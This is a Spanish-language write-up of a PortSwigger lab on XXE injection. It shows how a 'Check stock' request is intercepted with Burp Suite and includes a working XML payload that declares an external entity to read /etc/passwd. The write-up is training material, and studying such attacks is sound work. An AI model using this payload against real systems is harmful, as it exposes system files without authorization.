---
title: XXE Injection Lab 1
date: 2024-11-27 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - XXE Injection
tags:
  - XXE Injection
  - Exploiting XXE using external entities to retrieve files
image:
  path: /assets/img/XXE-Injection-Lab-1/Portswigger.png
---

## Skills

- Exploiting XXE using external entities to retrieve files

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` tiene una `función` llamada `Check stock` que analiza entradas XML y devuelve cualquier valor inesperado en la respuesta. Para resolver el laboratorio, hay que `inyectar` una entidad externa XML (XXE) para `obtener` el contenido del archivo `/etc/passwd`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/XXE-Injection-Lab-1/image_1.png)

Si pulsamos en `View details` veremos la `descripción` del `artículo`

![](/assets/img/XXE-Injection-Lab-1/image_2.png)

Si pulsamos en `Check stock` y `capturamos` la `petición` con `Burpsuite` vemos que se está tramitando un `XML`

![](/assets/img/XXE-Injection-Lab-1/image_3.png)

Vamos a insertar un `DTD (Document Type Definition)` y a usar el wrapper file para `cargar` el archivo `/etc/passwd`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Si `enviamos` la `petición` con este `payload` obtendremos el `/etc/passwd`

![](/assets/img/XXE-Injection-Lab-1/image_4.png)
